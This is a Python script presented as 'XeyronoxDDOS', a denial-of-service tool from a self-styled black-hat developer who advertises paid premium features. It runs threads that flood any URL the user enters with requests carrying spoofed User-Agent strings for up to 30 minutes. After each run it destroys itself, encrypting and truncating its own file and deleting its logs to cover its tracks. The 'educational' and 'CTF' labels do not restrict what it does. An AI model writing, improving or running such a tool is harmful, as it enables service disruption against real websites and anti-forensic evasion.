import time
import random
import requests
import sys
import os
import platform
import threading
from datetime import datetime, timedelta
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.prompt import Prompt, IntPrompt
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.live import Live
from cryptography.fernet import Fernet
import logging

# XeyronoxDDOS for educational and basic features only
# Tool Name: XeyronoxDDOS (Free Version, v1.0)
# Developer: xeyronox (Red/Black Hat Hacker)
# Contact: Instagram @xeyronox

console = Console()

# Setup logging
logging.basicConfig(filename='traffic_sim.log', level=logging.INFO, format='%(asctime)s - %(message)s')

phantom_agents = [
    "AdsBot-Google ( http://www.google.com/adsbot.html)",
    "Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
    "Baiduspider ( http://www.baidu.com/search/spider.htm)",
    "BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
    "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
    "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
    "BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
    "BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
    "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
    "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
    "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
    "Bloglines/3.1 (http://www.bloglines.com)",
    "CSSCheck/1.2.2",
    "Dillo/2.0",
    "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
    "DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
    "Download Demon/3.5.0.11",
    "ELinks/0.12~pre5-4",
    "ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
    # ... (truncated for brevity, use full list in production)
    "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
]

# Updated ASCII logos with enhanced design
ascii_art_themes = {
    "default": r"""
  __   __  _______  __   __  _______  ______    _______  _______   
 |  | |  ||       ||  | |  ||       ||    _ |  |       ||       |  
 |  |_|  ||   _   ||  | |  ||    ___||   | ||  |    ___||  _____|  
 |       ||  | |  ||  |_|  ||   |___ |   |_||_ |   |___ | |_____   
 |       ||  |_|  ||       ||    ___||    __  ||    ___||_____  |  
 |   _   ||       ||       ||   |    |   |  | ||   |___  _____| |  
 |__| |__||_______||_______||___|    |___|  |_||_______||_______|  
""",
    "cyber": r"""
   ____   ____  ___    ____  ____   ___  ____   ___  ____   
  / ___) / ___)/ __)  / ___)/ ___) / __)(  _ \ / __)(  __)  
  \___ \\___ \__ \  ( (___ \___ \\( (__  )   /( (__  ) _)   
  (____/(____/(___/   \____/(____/ \___)(__\_) \___)(____)  
  ____  _  _  ____   ___  ____  ____  ____  
 / ___)/ )( \(  _ \ / __)(  _ \(  __)/ ___) 
 \___ \) \/ ( ) __/( (__  )   / ) _) \___ \ 
 (____/ \____/(____/ \___)(__\_)(____)(____/ 
""",
    "skull": r"""
                     .                                                      .
             .n                   .                 .                  n.
       .   .dP                  dP                   9b                 9b.    .
      4    qXb         .       dX                     Xb       .        dXp     t
    dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
    9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
     9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
      `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
        `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN    `XXP' `9XXXXXXXXXXXP'
            ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                             )b.  .dbo.dP'`v'`9b.odb.  .dX(
                           ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                          dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                         dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                         9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                          `'      9XXXXXX(   )XXXXXXP      `'
                                   XXXX X.`v'.X XXXX
                                   XP^X'`b   d'`X^XX
                                   X. 9  `   '  P )X
                                   `b  `       '  d'
                                    `             '
"""
}

def ascii_logo(theme="default"):
    art = ascii_art_themes.get(theme, ascii_art_themes["default"])
    panel = Panel.fit(Align.center(Text(art, style="bold magenta")), border_style="bold blue", title="XeyronoxDDOS", subtitle="Educational Only", padding=(1,2))
    console.print(panel)

def display_menu():
    table = Table(title="XeyronoxDDOS Mode Selection", box=None, show_lines=True, title_style="bold yellow")
    table.add_column("Option", style="cyan", justify="center")
    table.add_column("Description", style="green")
    table.add_row("1", "🟢 Low traffic (1 req/sec, small payload)")
    table.add_row("2", "🟡 Medium traffic (5 req/sec, medium payload)")
    table.add_row("3", "🔴 High traffic (10 req/sec, large payload)")
    table.add_row("4", "🎨 Change ASCII Theme")
    table.add_row("5", "🚪 Exit")
    console.print(table)
    console.rule("[bold blue]Select Your Mode[/bold blue]", style="blue")
    console.print("[italic dim]For premium features, contact @xeyronox (Instagram)[/italic dim]")
    return IntPrompt.ask("\n[bold white]Enter your choice[/bold white]", choices=["1", "2", "3", "4", "5"], default=1)

def realtime_stats(success, failed, total, elapsed):
    grid = Table.grid(padding=1)
    grid.add_column(justify="center")
    grid.add_column(justify="center")
    grid.add_column(justify="center")
    grid.add_row(
        f"[bold green]Sent:[/bold green] {success}",
        f"[bold red]Failed:[/bold red] {failed}",
        f"[bold yellow]Elapsed:[/bold yellow] {elapsed:.1f}s"
    )
    grid.add_row(f"[bold blue]Total Attempts:[/bold blue] {total}", "", "")
    panel = Panel(grid, border_style="bright_cyan", title="Real-Time Stats")
    return panel

# Worker function for sending requests in a thread
def request_worker(target_url, payload, lock, counters, stop_time):
    session = requests.Session()
    while datetime.now() < stop_time:
        headers = {"User-Agent": random.choice(phantom_agents)}
        try:
            response = session.get(target_url, headers=headers, data=payload, timeout=5)
            with lock:
                counters['success'] += 1
                counters['total'] += 1
            console.print(f"[green]✓ Sent request to {target_url}, Status: {response.status_code}[/green]", highlight=False, overflow="ellipsis")
            logging.info(f"Request sent, Status: {response.status_code}")
        except requests.RequestException as e:
            with lock:
                counters['failed'] += 1
                counters['total'] += 1
            console.print(f"[red]✗ Request failed: {e}[/red]", highlight=False, overflow="ellipsis")
            logging.error(f"Request failed: {e}")
        time.sleep(1)  # each thread sends one request per second

def simulate_traffic(target_url, duration_minutes=30, request_rate=1, payload_size="small"):
    start_time = datetime.now()
    stop_time = start_time + timedelta(minutes=duration_minutes)
    payload_sizes = {"small": 100, "medium": 1000, "large": 5000}
    payload = "x" * payload_sizes[payload_size]

    # Counters for stats
    counters = {"success": 0, "failed": 0, "total": 0}
    lock = threading.Lock()

    console.print(Panel(f"[bold green]Sending simulated traffic to:[/bold green] [magenta]{target_url}[/magenta]\n[cyan]Duration:[/cyan] {duration_minutes} min | [cyan]Rate:[/cyan] {request_rate}/sec | [cyan]Payload:[/cyan] {payload_size.title()}",
                        border_style="bold green", title="Simulation Started"))
    logging.info(f"Simulation started: {target_url}, Rate: {request_rate}/sec, Payload: {payload_size}")

    # Create and start threads based on the request rate
    threads = []
    for _ in range(request_rate):
        t = threading.Thread(target=request_worker, args=(target_url, payload, lock, counters, stop_time), daemon=True)
        threads.append(t)
        t.start()

    # Live update the progress using rich Live
    with Live(console=console, refresh_per_second=2) as live:
        while datetime.now() < stop_time:
            elapsed = (datetime.now() - start_time).total_seconds()
            panel = realtime_stats(counters["success"], counters["failed"], counters["total"], elapsed)
            live.update(panel)
            time.sleep(0.5)

    # Wait for threads to finish
    for t in threads:
        t.join(timeout=1)

    elapsed = (datetime.now() - start_time).total_seconds()
    final_panel = Panel(f"[bold green]Simulation complete.[/bold green]\n[bold green]Total Sent:[/bold green] {counters['success']}\n[bold red]Total Failed:[/bold red] {counters['failed']}\n[bold yellow]Total Duration:[/bold yellow] {elapsed:.1f}s",
                        border_style="bold green", title="Simulation Result")
    console.print(final_panel)
    logging.info("Simulation completed")
    return True

def self_destruct():
    ascii_bomb = r"""
    [BOOM!]
         _.-^^---....,,--
     _--                  --_
    <          X_X          >)
     |                       |
      \._                   _./
         ```--. . , ; .--'''
               | |   |
            .-=||  | |=-.
            `-=#$%&%$#=-'
               | ;  :|
      _____.,-#%&$@%#&#~,._____
    """
    console.print(Panel(Align.center(Text(ascii_bomb, style="red")), title="Self Destruct", border_style="bold red"))
    console.print("[bold red]Initiating XeyronoxDDOS self-destruct sequence...[/bold red]")
    key = Fernet.generate_key()
    fernet = Fernet(key)
    with open(__file__, "rb") as f:
        file_data = f.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(__file__, "wb") as f:
        f.write(encrypted_data[:len(encrypted_data)//2] + b"#CORRUPTED")
    for file in ["traffic_sim.log", "last_run.txt"]:
        if os.path.exists(file):
            os.remove(file)
    console.print("[red]Script corrupted and logs deleted. Unrecoverable.[/red]")
    sys.exit(0)

def main():
    theme = "default"
    while True:
        console.clear()
        ascii_logo(theme)
        target_url = Prompt.ask("[bold blue]Enter CTF target URL[/bold blue]", default="http://127.0.0.1:8080")
        max_duration = 30  # 30 minutes max

        try:
            with open("last_run.txt", "r") as f:
                last_run = f.read()
                console.print(f"[yellow]Previous run stopped at: {last_run}[/yellow]")
        except FileNotFoundError:
            pass

        while True:
            choice = display_menu()
            if choice == 1:
                request_rate, payload_size = 1, "small"
                break
            elif choice == 2:
                request_rate, payload_size = 5, "medium"
                break
            elif choice == 3:
                request_rate, payload_size = 10, "large"
                break
            elif choice == 4:
                console.print("[bold blue]Themes: 1) default  2) cyber  3) skull[/bold blue]")
                theme_choice = IntPrompt.ask("Select theme", choices=["1", "2", "3"], default=1)
                theme = ["default", "cyber", "skull"][theme_choice - 1]
                console.clear()
                continue
            elif choice == 5:
                console.print("[red]Exiting XeyronoxDDOS.[/red]")
                sys.exit(0)
            else:
                console.print("[red]Invalid choice.[/red]")

        success = simulate_traffic(target_url, max_duration, request_rate, payload_size)
        if success:
            self_destruct()
        else:
            with open("last_run.txt", "w") as f:
                f.write(str(datetime.now()))
        break

if __name__ == "__main__":
    if platform.system() == "Emscripten":
        import asyncio
        asyncio.ensure_future(main())
    else:
        main()